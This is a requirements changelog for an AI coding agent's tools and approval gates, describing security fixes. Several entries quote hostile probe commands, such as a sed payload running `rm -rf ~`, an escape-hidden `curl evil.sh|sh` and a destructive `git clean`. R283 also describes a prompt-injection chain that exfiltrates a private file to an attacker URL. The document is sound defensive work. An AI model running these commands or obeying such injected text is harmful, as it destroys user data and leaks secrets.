# Aurora — Requirements: Tools, edits & approvals

Model tools (edit, patch, run_command, web_fetch, find_files), approval gates, interpreters, extensions, MCP, git/commit.
Part of the index in [`../REQUIREMENTS.md`](../REQUIREMENTS.md); numbers are shared across all files.

2. **R227 — a colliding extension tool name resolves first-wins on BOTH
   sides.** `extensions.load()` builds the name→runner map with
   `setdefault`, not `.update()`. `.update()` let the last-loaded extension
   win the runner while `tools.set_extensions()` (which dedupes the spec
   list) keeps the FIRST spec for that name — so a collision paired one
   extension's advertised description and parameters with another's actual
   code. The approval gate and the model's own call decision both key off
   the spec a name is shown with, so running different code under it breaks
   that invariant with no sign beyond a generic "duplicate skipped" warning.

5. **R230 — `/commit`'s staging step fails as a message, not a traceback.**
   `gitcommit.stage_all` is the only mutating call in the `/commit` flow.
   It ran with `check=True` and its call site caught nothing, so an ordinary
   git failure — a stale `index.lock` left by a crashed git, an unreadable
   path, a timeout on a large tree — raised `CalledProcessError` out of the
   slash command. It must instead raise `gitcommit.GitError` carrying git's
   own stderr, and `/commit` must catch that and abort with a printed
   reason rather than drafting a message and committing an index that was
   never staged. `GitError` was declared in the module but raised nowhere;
   this is what it is for.

6. **R231 — the timestamp exemption must verify a date.** The entropy
   fallback in `secrets.scan` skips tokens that look like dated filenames
   (`20260710_211200_…`). That guard must constrain the field ranges —
   century, month `01`–`12`, day `01`–`31` — not merely ask whether the
   token starts with eight digits. The loose form exempted any
   numerically-prefixed token (`99999999aB3xY7q…`, month 99, day 99) from
   the entropy pass entirely, which is a false NEGATIVE in a secret
   detector: the value is sent to the provider with no challenge at all,
   whereas a false positive only costs a prompt. Real dated filenames must
   keep being exempted.

11. **R236 — `patch.parse` ends a hunk body only at a real file header.**
   A hunk body line is content, whatever it starts with. Ending the body at
   any line starting with `---`/`+++` misreads the removal of a `---` line
   (rendered `----`) or the addition of a `++` line (rendered `+++`) as a
   new file section, truncating the hunk and discarding the rest of it. That
   broke the module's central all-or-nothing guarantee two ways, both
   reporting success: a deletion-only hunk collapsed to pure context and
   applied nothing, and a mixed hunk applied its earlier edits while
   silently dropping everything after the `---`. `---`/`+++` lines are
   markdown horizontal rules and YAML front-matter delimiters, so this is
   reachable on ordinary documents. A file header is recognised as the PAIR
   `--- <path>` followed by `+++ <path>` (marker then a space), or a
   `diff ...` section line — never a bare prefix match. Multi-file
   `diff -u` output keeps parsing into separate hunks, and `git diff`
   output with `diff --git`/`index` lines now parses too, which the prefix
   check rejected outright.

13. **R238 — an extension tool spec with no runner is skipped, loudly.**
    `tools.set_extensions` must drop any spec whose name has no entry in
    `runners`, with a warning, exactly as it already drops a nameless one.
    Keeping it advertises a tool to the model that `run_tool` answers with
    `[error: unknown tool '<name>']` on every call — "advertised and
    permanently uncallable", the precise failure the nameless-spec guard was
    added for, reached through a different door and with no warning at all.
    The model can burn its whole iteration budget retrying. This is ordinary
    in a hand-written extension (a tool renamed in `SPEC` but not in
    `RUNNERS`, a typo in a `RUNNERS` key), and `discover()` merges static and
    `register()`-supplied tools before this runs, so requiring the pair rules
    out no legitimate arrangement. Only the unpaired spec is dropped — one
    typo must not disable an extension's other tools. Relatedly,
    `extensions.scaffold` writes through `write_text_atomic`: R207's comment
    named the truncation risk but fixed only the encoding half.

14. **R239 — every interpreter code-injection variable is stripped from an
    MCP child's environment.** `mcp._ENV_DENYLIST` exists because a server's
    `env:` block is hand-edited YAML and these names are not identity or
    secrets but *code execution* in the child. The list must therefore cover
    both the path and the option variable of each interpreter family:
    `PYTHONPATH`/`PYTHONHOME`/`PYTHONEXECUTABLE`, `PERL5LIB`/`PERL5OPT`/
    `PERLLIB`, `RUBYOPT`/`RUBYLIB`, `CLASSPATH`/`JAVA_TOOL_OPTIONS`/
    `_JAVA_OPTIONS`/`JDK_JAVA_OPTIONS`, alongside the loader and shell
    entries already present. It previously listed Perl's path variable and
    Ruby's option variable but only one of each pair, and for Python only
    `PYTHONSTARTUP` — which Python reads in INTERACTIVE mode only, so it has
    no effect on a spawned server, while `PYTHONPATH`, which prepends to
    `sys.path` and runs a shadowing module at import time before the
    server's first line, was absent. A stdio MCP server is very often a
    Python process; this repo's own `agentic_context_mcp` entry runs one.
    Stripping stays unconditional (never allowlist-filtered), so a typo
    cannot reintroduce one, and an ordinary configured variable such as
    `GITHUB_TOKEN` must still reach the child.

17. **R242 — a versioned interpreter name is the same command.**
    `approve._is_dangerous` tests each token's basename against
    `DANGEROUS_COMMANDS` by exact match, so it must also test the name with
    a trailing version suffix stripped (`python3.11`→`python`, `pip3`→`pip`,
    `perl5.36`→`perl`, `node20`→`node`). Without it, `python3` was
    recognised and `python3.11` — the standard binary name on most Linux
    distributions and Homebrew — was not, which reopened R149's bug on the
    entry R149 itself calls worst ("interpreters: the ARGS are the program,
    so no prefix of them is safe"): approving a harmless
    `python3.11 -c "print(1)"` stored the two-token rule `python3.11 -c`
    and thereafter auto-approved `python3.11 -c "<anything>"` with no
    prompt, permanently. Verified end to end before and after. The exact
    command the user approved must still auto-approve, and ordinary
    commands (`gcc-13`, `sha256sum`, `base64`) must not be swept in — the
    strip only matters when the stripped stem is itself in
    `DANGEROUS_COMMANDS`, and over-triggering costs only a re-prompt.

18. **R243 — the ungated lint fallback writes nothing.** `lint_check` is not
    in `tools.NEEDS_APPROVAL` and is not an `mcp_*` name, so
    `tools.needs_approval` returns False and it runs with no approval
    prompt. Its no-ruff fallback must therefore do a genuinely read-only
    syntax check — the built-in `compile()` on the file's source, in
    process. It previously shelled out to `python -m py_compile`, which
    writes `__pycache__/<name>.cpython-XY.pyc` beside the source as a side
    effect: a tool the user never approved created files in their tree,
    dirtying a clean repo and failing outright against a read-only
    directory. The in-process form also removes an interpreter spawn per
    call, and must still report a real syntax error with its line number.

19. **R244 — MCP server `command`/`args` expand `~` and `$VARS`.**
    `config.yaml` is tracked in git and shared across machines with
    different home layouts (e.g. macOS `~/Desktop/the dev repo/...` vs Linux
    `~/projects/...`), but `MCPManager` passed `command`/`args`
    straight to `Popen`, which does no shell-style expansion — a literal
    absolute path in the config only ever worked on the machine it was
    written on, and broke silently (logged error, not a crash) the moment
    the file was pulled onto the other machine. `command` and each entry
    in `args` must now be run through `os.path.expanduser` and
    `os.path.expandvars` before spawning, so config.yaml can use `~` and
    env vars and stay valid on both machines.

20. **R245 — a long `run_command`/a busy turn must not block asking "is it
    done yet?".** Two related gaps, both from the same root cause: exactly
    one thing runs at a time in Aurora (the model's own tool call blocks
    the whole turn; the TUI's `_worker` is the sole consumer of its one
    inbox, so a `!` command typed while it's busy just queues behind it).
    - `run_command` takes `background: bool` — when true it launches the
      command detached (same process-group ownership as the foreground
      path) and returns a job id immediately instead of blocking until
      exit. `check_command(job_id)` (no approval needed, read-only) polls
      a background job's status and recent output, `tail`-bounded; with no
      `job_id` it lists every known job. Capped at `MAX_BACKGROUND_JOBS`
      concurrent jobs; any still running at process exit are killed
      (atexit), not left orphaned. This lets the MODEL answer "is it
      downloading?" as an ordinary new turn instead of that question
      having to wait behind the download's own blocking tool call.
    - The TUI gained a second queue + worker (`_side_inbox`/`_side_worker`)
      that only `!` bash commands submitted while the main worker is busy
      route to — they run CONCURRENTLY with whatever the main worker is
      doing, instead of queuing behind it. `cd`/`clear` are refused there
      (not silently, not by racing `self._bash_cwd`/the scrollback against
      the main worker) since the two threads share that state with no
      lock between them; anything read-only (`tail`, `ps`, checking a
      download's progress) runs normally. This lets the HUMAN check on
      something themselves without waiting on the model's own turn.

22. **R247 — Aurora can use plain-Markdown "doc skills" (Claude Code-shaped
    SKILL.md), not just its own executable ones.** `/name` already ran an
    executable or `.py` skill (R11); it now also resolves against any
    `SKILL.md` (frontmatter `name:`/`description:` + prose) found under the
    directories the user names in config.yaml's `doc_skill_roots:` list — a
    plain YAML list, as many paths as wanted, no default. Unlike an
    executable skill there is nothing to subprocess: the body is fed to the
    model as a real, tool-enabled turn via `_run_turn` — the exact mechanism
    `/bootstrap` already uses to turn a saved file into a prompt, not a new
    one. `/skills` lists both kinds together, doc skills marked `[doc]`; an
    executable skill wins a name collision, same shadowing rule `discover()`
    already applies between its own two search dirs.

    **No path is ever assumed.** `doc_skill_roots:` absent or empty means no
    doc skills — Aurora is not tied to any one machine's layout, so nothing
    in `aurora/skills.py` names a path. This machine's own two libraries
    (any directory listed under `doc_skill_roots`) are
    data in this repo's own `config.yaml`, alongside the other machine-
    specific values already there (`base_url`, the `mcp_servers` path) — not
    a constant in the source.

    **Two real bugs found and fixed while building this, both proven against
    the actual skill corpus, not hypothetical:**
    - `Path.rglob` does not follow a symlinked category directory (this
      machine's own `SKILLS/{analysis,meta,writing}` all are, pointing into
      a separate skills repo). `recurse_symlinks` only exists on 3.11's
      `rglob` from Python 3.13, and this project supports 3.11+, so it
      can't be relied on portably either way. Measured: `rglob` found 1 of
      6 real `SKILL.md` files under this repo's own SKILLS root, the other 5
      silently absent, no error. Fixed with `os.walk(..., followlinks=True)`,
      which also degrades on an unreadable directory for free (`onerror`
      defaults to ignoring `OSError`, unlike `rglob` which raises).
    - A `description:` whose prose contains its own bare `word: word` is
      invalid strict YAML (an unquoted colon+space ends a plain scalar) and
      is common in the real corpus, not a one-off typo — confirmed on
      `agentic-context-bootstrap`'s actual live file
      ("...a topic: SOUL.md's machine brief...")
      , which came back with **no** description under a strict-only parser.
      `_parse_frontmatter` now falls back to a lenient line-by-line
      `key: value` extractor (splitting only the first colon) when strict
      YAML fails, recovering exactly the two fields this module reads
      (`name`, `description`) without attempting to be a real YAML parser.

    **Test:** `tests/test_skills.py` — discovery from an unconfigured/empty/
    nonexistent root returns nothing (never a guessed path); a nested
    `SKILL.md` found recursively; earlier-root shadowing; survival of an
    unreadable root; frontmatter stripped from the body, including the
    embedded-colon regression case above; unknown name returns `None`;
    `/skills` listing shows both kinds with `[doc]` marking the prose ones;
    an executable skill shadows a doc skill of the same name. Full suite
    (1273 tests) re-run clean after the change.

32. **R262 — `/auto-approve on|off` skips the approval prompt for the
    session.** Feature request: on a long tool-heavy turn, approving one
    gated call after another gets tiring. `/auto-approve on` makes every
    call that would normally stop and ask run unprompted instead — same as
    picking "Yes" at every gate yourself — logged under its own
    `auto_approved` decision (a new `AgentCallbacks.auto_approve` callable,
    polled fresh per gated call, not a snapshot at turn start, so toggling
    mid-turn takes effect on the very next call) so the session log still
    shows WHY nobody was asked, distinct from an ordinary allowlist hit.
    Two things it deliberately does NOT bypass: a `/denylist` rule still
    blocks its call outright (checked and `continue`d past, unconditionally
    of auto-approve, same "deny always wins" design as R120), and a
    detected secret still stops and asks separately (`secret_challenge` is
    an unrelated gate).
    Session-only, NOT persisted to `runtime.yaml` — unlike `/fallback` and
    `/multiline`, a standing config-file bypass of the approval gate is a
    much bigger foot-gun than a toggle that always starts back off on a
    fresh run. While it's on, the TUI status bar carries a persistent `⚠
    auto-approve ON` tag — the whole point of the session-only default is
    that this is meant to be a temporary "stop nagging me for this task"
    switch, not a standing preference, and a toggle with no visible
    reminder is exactly how it gets left on into an unrelated, riskier
    request.

    **Test:** `test_auto_approve_skips_the_prompt_and_logs_its_own_decision`,
    `test_auto_approve_never_overrides_a_denylist_rule`,
    `test_auto_approve_command_toggles_and_reports_status`,
    `test_auto_approve_is_session_only_not_persisted`,
    `test_status_bar_warns_while_auto_approve_is_on`.

35. **R265 — a secret "stop" on a write argument closes the turn validly.**
   `agent.run_turn`'s write-argument scan (write_file/edit_file/apply_patch)
   returned on "stop" without recording anything, unlike the reply-scan stop
   (P-1). On a first round that left history ending on the user message, so
   the next send stacked two user turns, and the requested calls never
   reached `on_tool_result`. It now reports each call as skipped, drops the
   tool calls, and appends a tool-call-free assistant message (a placeholder
   when the reply had no text). The secret never enters history.

   **Test:** `tests/test_deepdive_regressions.py::test_write_arg_secret_stop_leaves_a_closed_valid_history`.

38. **R268 — tool arguments must be a JSON object.** `openai_compat.turn` only
   checked that a tool call's arguments parsed as JSON. A list, string,
   number or `null` became `ToolCall.arguments` and raised `AttributeError`
   in the agent loop AFTER the assistant `tool_calls` message was appended,
   so history kept an orphaned tool_call that every later request sent (and
   `Engine.send` only cleans up a dangling USER message). A non-object now
   raises `MalformedToolCall` and takes R5's retry-then-degrade path.

   **Test:** `test_non_object_tool_arguments_raise_malformed` (list/string/
   number/null), `test_run_turn_degrades_instead_of_orphaning_a_tool_call`.

39. **R269 — model edits keep a file's line endings.** `edit_file` and
   `apply_patch` read with `read_text` (universal newlines) and wrote in text
   mode, so one edit rewrote every CRLF in a Windows-style file as LF: a
   whole-file diff and a silent line-ending change. A uniformly-CRLF file is
   now edited in LF form (so a model's LF-joined `old` and hunks still
   match) and written back as CRLF. Any other file (LF or mixed) is read and
   written byte-faithfully: `paths.write_text_preserving` writes with
   `newline=""`.

   **Test:** `test_edit_file_keeps_crlf_line_endings`,
   `test_apply_patch_keeps_crlf_line_endings`,
   `test_edit_file_leaves_lf_and_mixed_files_byte_faithful`.

40. **R270 — `edit_file` refuses an empty `old`.** `text.count("")` is
   `len(text) + 1`, so `replace_all=true` with `old=""` inserted `new`
   between every character of the file (`abc` → `XaXbXcX`). It now returns
   an `[error: ...]` pointing at `write_file`, and the file is untouched.

   **Test:** `test_edit_file_rejects_empty_old` (with and without replace_all).

41. **R271 — model-run commands never inherit the terminal's stdin.**
   `_run_command_once` and `_start_background` spawned with no `stdin`, so
   a command inherited the TUI's own terminal, which prompt_toolkit holds in
   raw mode. Anything that reads stdin (a REPL, a y/N prompt, `git commit`
   without `-m`, `head`) fought the TUI for keystrokes or blocked until
   COMMAND_TIMEOUT (300s). Both now use `stdin=DEVNULL`: EOF is the honest
   answer, since nobody can type there.

   **Test:** `test_a_stdin_reading_command_gets_eof_not_a_hang`,
   `test_background_job_stdin_is_not_inherited` (fd 0 swapped for an open,
   silent pipe; pytest's own fd 0 hides the bug).

43. **R273 — a gated call with no target path invalidates the per-file undo
   snapshot.** `rewind.clear_last_mutation()` existed so that "the last
   mutation" could not outlive a later, differently-shaped one, but nothing
   called it. The engine's checkpoint callback only ever took a snapshot
   (when args had `path`). After `edit_file(A)` followed by any
   `run_command`, `/undo` still offered, and reverted, A's older edit while
   the real last change was ignored. That is the exact "undo reverted the
   wrong thing" incident `undo_preview` documents. A pathless gated call
   (`run_command`, `wait_until`, `cancel_command`, `mcp_*`) now clears the
   snapshot.

   **Test:** `test_undo_never_reverts_an_older_edit_after_a_command`.

47. **R277 — "always allow" never generalizes over a command's payload.** The
   two-token rule stores the command plus its first argument. For these
   commands that first argument is the harmless half and the payload
   varies freely. Verified before the fix, each probe auto-approved with no
   prompt: `sed -i s/a/b/ f` stored `sed -i` and then approved
   `sed -i '1e rm -rf ~' ~/.bashrc` (GNU sed's `e` runs a command);
   `git -c color.ui=false status` stored `git -c` and then approved
   `git -c core.sshCommand=… fetch`; also `tar -xf evil.tar -C /`,
   `rsync -a --delete / x` and `uv run evil.py`. `DANGEROUS_COMMANDS` gains
   editors/stream processors (sed, awk, ex, vim, ed), archivers/copiers
   (tar, unzip, rsync, scp, sftp, ssh), runners (uv, uvx, pipx, poetry,
   pdm, hatch, conda, go, deno, bun, php, lua, java, Rscript, xargs, env,
   nohup, timeout, nice, watch, crontab, at) and killers (kill, pkill,
   killall), which makes their rules exact-match only. `git` keeps prefix
   generalization unless a token is `-c`/`--config-env`/`--exec-path`.

   **Test:** `test_always_allow_does_not_generalize_payload_commands` (10
   approved/probe pairs), `test_plain_git_subcommands_still_generalize`.

51. **R281 — an `apply_patch` hunk anchors on whole lines only.**
   `patch.apply` located a hunk's context+removed lines with a raw substring
   count and `str.replace`. A hunk could anchor in the middle of an
   unrelated line and edit it while reporting success, and a whole-line
   match could be rejected as "matches 2 times" because of a substring
   elsewhere. Verified: `-count = 5 / +count = 6` turned `total_count = 5`
   into `total_count = 6`. A match now counts only if it starts at a line
   start and ends at a line end. The approval preview uses the same
   function, so preview and result still agree.

   **Test:** `test_patch_never_anchors_inside_a_line` (3 cases, including a
   multi-line match straddling line ends),
   `test_patch_counts_only_whole_line_matches_for_uniqueness`.

52. **R282 — `web_fetch` strips script/style blocks in linear time.** The
   strip was `re.sub(r"<(script|style)[\s\S]*?</\1>", …)`. On an opener with
   no closer the lazy scan runs to the end of the text, and it is retried
   from every later opener, which is quadratic. Measured: 224KB of unclosed
   `<script` took 33.7s, and the fetch cap is 2MB, on an ungated,
   PARALLEL_SAFE tool that Esc could not interrupt. `_strip_script_style`
   is one forward pass: every search starts where the last one ended. An
   unclosed block swallows the rest of the page, as a browser would. Proper
   pairs strip exactly as before, case-insensitive, `</script >` included.

   **Test:** `test_script_strip_is_linear_on_unclosed_tags` (2.1MB, <1s),
   `test_web_fetch_end_to_end_is_fast_on_hostile_html` (35.5s → failing
   before the fix), `test_script_strip_matches_the_old_behaviour`.

53. **R283 — `web_fetch` asks before reaching a private host or sending a query
   string.** `web_fetch` and `read_file` were both ungated, so injected text
   in a fetched page could chain `read_file(<private file>)` →
   `web_fetch("https://attacker/?d=<contents>")`, or read an internal
   service (a LAN admin UI, `127.0.0.1:9512`, `169.254.169.254`), with no
   prompt at all. `tools.needs_approval(name, args)` now gates a fetch whose
   URL targets a non-public host (loopback, private, link-local, reserved,
   `localhost`/`.local`/`.ts.net`/`.internal`/`.lan`/`.home`, or a name
   resolving to one of those), carries a query string, or isn't http(s). A
   plain public page still runs with no prompt. A gated fetch is never
   prefetched by the R94 parallel batch. Redirects are followed manually,
   one hop at a time, and a public URL redirecting to a private host is
   blocked. "Always allow" stores the origin (`scheme://host:port/*`) and
   matches it exactly, never a bare `*`. The approval prompt shows the URL
   and why it asked. The mutation checkpoint still asks by name alone, so a
   fetch takes no checkpoint.

   **Test:** `test_url_needs_approval_policy` (10 URLs),
   `test_private_fetch_is_gated_and_never_prefetched`,
   `test_redirect_from_public_to_private_is_blocked`,
   `test_always_allow_web_fetch_is_scoped_to_one_origin`.

54. **R284 — `/commit`'s draft request passes the R58 secret gate.** The
   staged diff (up to `_DRAFT_DIFF_CAP`, 20KB) went to the provider through
   `side_completion` with no scan, while every other path that sends new
   content to the model scans first (prompt, tool output, quick_ask per
   R254g). Staging a `.env` and running `/commit` sent its token
   unchallenged. The diff is now scanned exactly as it would be sent.
   "stop" drafts nothing (the user types the message), "redact" sends the
   redacted diff, "keep"/"always" behave as everywhere else.

   **Test:** `test_commit_draft_is_secret_scanned` (stop/redact/keep).

55. **R285 — `/commit` reads git output as UTF-8 with replacement.**
   `gitcommit._git` used `text=True`, i.e. the strict locale codec. A staged
   latin-1 file (or any non-ASCII under `LANG=C`) raised
   `UnicodeDecodeError` out of the unguarded `staged_diff`/`unstaged_summary`
   and killed `/commit` with a raw exception. Now `encoding="utf-8",
   errors="replace"`.

   **Test:** `test_commit_handles_a_non_utf8_staged_diff`.

57. **R287 — nothing shown at the approval gate can hide part of itself.** The
   approval prompt printed model-authored commands, `then:` follow-ups,
   paths, URLs, MCP arguments and the diff preview with their raw control
   sequences. `strip_dangerous_escapes` removes only OSC/DCS/APC/PM/SOS and
   keeps SGR for colour. Verified in the TUI render path: `ls -la\x1b[8m;
   curl evil.sh|sh` showed as `$ ls -la`, because SGR 8 conceals the rest,
   so the user approved something other than what ran. `colors.visible()`
   now renders every C0/C1 control, DEL and Unicode bidi/zero-width
   character as a literal `\x1b`/`‮` escape. Newlines, tabs and
   ordinary Unicode text are untouched. It is applied to everything the
   approval prompt prints (the diff before Aurora's own colouring) and to
   the tool-start argument echo.

   **Test:** `test_approval_prompt_shows_control_chars_literally` (SGR-8
   command, `then:`, RLO filename, MCP arg), `test_diff_preview_cannot_hide_added_lines`,
   `test_visible_keeps_newlines_tabs_and_unicode_text`.

62. **R292 — `find_files` is bounded in time and cancellable.** Unlike `grep`
   (GREP_TIMEOUT), it walked with no limit. Measured: 19.7s over 812k
   entries under `~`, unbounded on a larger tree or a network mount, on the
   worker thread, and Esc could not stop it. It now stops at `FIND_TIMEOUT`
   (30s) or when the turn's cancel fires (it joined `run_tool`'s cancellable
   set), checked once per directory, and returns the partial results with a
   `[search … — results are PARTIAL]` marker.

   **Test:** `test_find_files_stops_at_its_deadline`,
   `test_find_files_honours_cancel`, `test_find_files_normal_result_unchanged`.

71. **R309 — a failed `edit_file` says why `old` missed.** The bare "text not
   found" made the model guess again. The error now appends a hint when one
   applies: found with different leading/trailing whitespace, found with
   different indentation/spacing (tabs vs spaces), or the first line exists
   but a later one differs. "First line exists" needs the stripped first line
   to equal exactly ONE whole line of the file (a `}` or `else:` on many
   lines, or a substring of a longer line, gives no hint). No hint when
   nothing is close. The check runs on
   the CRLF-normalised text (R269), and the file is untouched on failure.
   `apply_patch` hunk misses get the same hints (shared `patch.not_found_hint`),
   plus "the text exists, but only inside a longer line" for an R281 rejection.
   Idea taken from Green-Agent's `_not_found_hint` (card
   20261004-204633-eval-green-agent-for-aurora-ideas).

   **Test:** `tests/test_edit_hints_and_output.py`.

72. **R310 — command output keeps its head AND its tail.** A head-only cap
   dropped the end of a long test/build run, where the failure summary is.
   Capture keeps the first and last half of `COMMAND_OUTPUT_CAP` per stream
   (memory still bounded, pipe still drained — R153/R194), with a
   `[... N bytes omitted ...]` marker between. `run_command` and
   `wait_until` additionally return at most `COMMAND_RESULT_LIMIT` (50k
   chars: 25k head + 25k tail) to the model, so a noisy command costs at most
   ~15k tokens of context. The limit holds on every path that returns output
   to the model: normal exit, timeout (the classic runaway), cancel, and
   skill scripts (`skills.run`).

   **Test:** `tests/test_edit_hints_and_output.py`.


73. **R319 — "always allow" never stores the harmless half of a payload.**
    A rule is the first two tokens, so a flag or a database/interpreter name as
    the second token left the payload free: `sort -o` → `sort -o ~/.bashrc`,
    `psql -c`/`mysql -e` → any SQL, `sqlite3 app.db` → `'.shell id'`,
    `tcsh -c` → any script, `git -C ../lib status` → `git -C / clean -fdx`,
    `git config user.name` → `git config alias.x '!cmd'` / `core.fsmonitor`.
    Now: a non-safe command whose second token is a flag is stored whole
    (exact-only); `sqlite3 psql mysql mariadb mongosh redis-cli csh tcsh pwsh
    tclsh wish expect julia swift irb luajit groovy scala kotlin dotnet sort nc
    ncat socat telnet ftp` join `DANGEROUS_COMMANDS`; `git` with
    `-C/--git-dir/--work-tree/--namespace` or a `config`/`alias` subcommand is
    dangerous, which also makes rules already stored as `git -C` / `git config`
    inert at match time.

    **Test:** `tests/test_deepdive_20261022.py` (R319 group).

74. **R320 — `web_fetch` decides "private" the same way its approval gate does.**
    The gate checked the host without DNS (R300) while the fetch re-checked it
    with DNS and treated a hit as "the user approved a private target", which
    disabled the rebinding and redirect guards. Any host the gate missed
    (`127.1`, `2130706433`, a bare VPN name like `myhost`) was fetched
    unprompted. Now `_private_host` also recognises shorthand/decimal/hex IPv4
    and bare single-label names as private (so they prompt), and the fetch's
    `approved_private` is computed with `resolve=False`, so a public-looking
    name that resolves private is blocked by the rebinding guard, not approved.

    **Test:** `tests/test_deepdive_20261022.py` (R320 group).

75. **R321 — a read never runs ahead of an earlier write in the same round.**
    `agent.run_turn` prefetched every `PARALLEL_SAFE` call of a round before
    running any call in order, so `[edit_file a.py, read_file a.py]` returned
    `a.py` as it was BEFORE the edit, and a `list_dir` after a `mkdir` missed the
    new directory. Only the reads that precede the round's first non-read call
    are prefetched; later ones run in order.

    **Test:** `tests/test_deepdive_20261022.py::test_read_after_edit_in_one_round_sees_the_edit`.

76. **R322 — an edit keeps the file's inode.** `write_text_preserving` wrote a
    temp file and `os.replace`d it, so a single file bind-mounted into a
    container (a `Caddyfile`) kept showing the old content, hard links were
    split, and owner/group/xattrs were lost. An EXISTING regular file is now
    rewritten through its own inode: space is reserved first (`posix_fallocate`,
    so ENOSPC raises before anything is touched) and the old bytes are restored
    if the write fails. A new file still goes through the atomic temp+rename.
    Trade-off accepted: a hard kill mid-write can leave the file partly written
    (it could not before); the old bytes are restored on every catchable failure.

    **Test:** `tests/test_deepdive_20261022.py` (R322 group), `tests/test_paths.py`.

77. **R323 — the umask is read, never toggled.** `_umask()` set the
    process-wide umask to 022 and back on every write, so another thread
    creating a file in that window got the wrong mode. It is now read once from
    `/proc/self/status` and cached (set-and-restore remains only as the
    first-call fallback where `/proc` is missing).

    **Test:** `tests/test_deepdive_20261022.py::test_umask_is_read_without_toggling_it`.

78. **R324 — the approval preview is computed the way the tool will write.**
    `diff_preview` read files with universal newlines (`\r\n` and a lone `\r`
    both became `\n`) while `edit_file`/`apply_patch` read byte-faithfully
    (R269), so on a mixed-ending file the approved diff differed from the
    change that landed. It now uses the tools' own reader, and an `edit_file`
    whose `old` is missing, or occurs 2+ times without `replace_all`, previews
    as `[edit will fail: …]` instead of showing a one-place change for a call
    that errors.

    **Test:** `tests/test_deepdive_20261022.py` (R324 group).

79. **R327 — `read_file` pages and tails without scanning decoded lines.**
    Paging re-read the file from line 1 on every page, decoding and counting
    each skipped line (2M-line log: 306 ms at the end, ~3 s per page on 1 GB).
    The skip now counts newlines in 1 MB binary blocks and seeks, and a new
    `tail=<n>` argument returns the last n lines by reading backwards from the
    end (O(n); the header gives the total only when the whole file was reached).
    Line numbers, the "fewer than N lines" message and CRLF/UTF-8 handling are
    unchanged.

    **Test:** `tests/test_deepdive_20261022.py` (R327 group).

80. **R328 — the secret scan skips source code and word-shaped names.** Reading
    Aurora's own `tui.py` raised a keep/redact/stop challenge for
    `double-Esc-within-2s` (high-entropy), `password=Condition(lambda:` and
    `draft_tokens = ""` (env credential). An `Env credential` whose value is an
    empty string, an f/r/b-string, `None/True/False/null` or a call is code and
    is skipped; a candidate token of 3+ `-`/`_`-joined short word-shaped
    segments (`lowercase`, `Capitalized`, `ALLCAPS≤5`, `2s`) is a name and is
    skipped. Bare words, quoted text and mixed-case random tokens still match.

    **Test:** `tests/test_deepdive_20261022.py` (R328 group).

81. **R329 — "keep" on a tool's output is remembered for the session.** The
    same file read twice asked twice. A `keep` answer to a `tool:` challenge now
    adds the matched values' hashes to `Engine.secret_session_keep`, consulted
    only when scanning tool OUTPUT (not prompts, replies or writes) and never
    persisted — unlike "always allow", which still writes to config. (The
    challenge list was already capped at 10 lines with "… and N more", and is
    one decision however many matches, so a 3,598-match blob is one prompt.)

    **Test:** `tests/test_deepdive_20261022.py::test_keep_on_tool_output_is_remembered_for_the_session`.

82. **R334 — "allow for this session" at the approval prompt.** The choice was
    once or forever, so the the server allowlist grew to 343 rules. A new `t` answer
    ("Allow for this session only (not saved)") runs the call and keeps the rule
    in memory (`approve._SESSION_RULES`), built by the same `_rule_for` — so every
    R149/R319 scoping rule applies — and gone when Aurora exits. `/allowlist`
    lists them under "this session only". Logged as `session_allow`.

    **Test:** `tests/test_deepdive_20261022.py` (R334 group).

83. **R335 — the approval prompt shows what "always" would save.** The `a` row
    reads `Always allow this (remember) — saves `git status` (any command
    starting `git status`)`, or `… (exactly this command)` / `(… with any
    arguments)` / `(any page on that site)`, from `approve.rule_scope`.

    **Test:** `tests/test_deepdive_20261022.py::test_rule_scope_describes_the_reach`.

84. **R336 — `/allowlist audit` and `/allowlist prune`.** `approve.audit()` lists
    command rules that are `duplicate`, `legacy` (single non-safe token) or
    `exact-only` (a two-token rule on a command today's classifier would store
    whole: dangerous, compound, or a flag second token). `prune` removes them
    after a y/N; nothing is deleted by `audit`.

    **Test:** `tests/test_deepdive_20261022.py::test_audit_and_prune_find_stale_rules`.

85. **R338 — `web_fetch` returns readable text.** Tags were stripped with a regex,
    so every fetch carried the menu, footer, cookie form and related-links text.
    Now `html_to_text` drops `nav footer aside form noscript svg template iframe`
    (and script/style) in the same linear single pass as R282, prefers the first
    `<main>` or `<article>` body when it has one, keeps block tags as line breaks
    and `<li>` as `- `, decodes entities and collapses blank runs. An
    `application/pdf` response (or `%PDF-` body) returns a one-line "this is a
    PDF" message instead of binary garbage. Non-HTML text types are returned
    as-is.

    **Test:** `tests/test_web_extension.py` (R338 group).

86. **R339 — `/plan on|off` (plan mode).** Approving twenty prompts to see where
    a task is going is the wrong way round. With plan mode on, the agent loop
    refuses every call that `needs_approval` — writes, edits, commands, MCP tools,
    and even ones an allowlist rule or `/auto-approve` would have run — with
    `[plan mode — not run … Put this step in your plan instead.]`, logged as the
    `plan_mode` gate decision. Reads, searches and fetches still run. Session-only
    (off at start), shown as `✎ plan mode` on the status bar.

    **Test:** `tests/test_deepdive_20261022.py` (R339 group).

87. **R340 — `/budget`: spend caps.** OpenRouter spend through Aurora was
    uncapped. `/budget <usd>` caps the session (memory only), `/budget day <usd>`
    caps each calendar day across sessions (`runtime.yaml: daily_budget_usd`,
    totals in `AURORA_HOME/spend.json`, 60 days kept), `off` clears either;
    `/budget` shows both. Both default to off. At 80% of a cap one warning is
    shown; at 100% the round's tool calls are skipped (`[skipped: spend limit
    reached …]`, so history stays valid) and `Engine.send` refuses new messages
    until the cap is raised. Only priced models accrue spend.

    **Test:** `tests/test_deepdive_20261022.py` (R340 group).

## R350 — A repeating model is stopped (2026-10-24)
- Rule: when every tool call of a round repeats the previous round's call with the identical result, for
  `agent.REPEAT_ROUNDS_STOP` (3) rounds in a row, the turn ends with the notice "stopped: the model keeps repeating the
  same call". The repeat nudge compares raw outputs, so it fires on every repeat, not every other one.
- Covered by `tests/test_core.py::test_agent_loop_stops_a_model_that_ignores_the_repeat_nudge`.

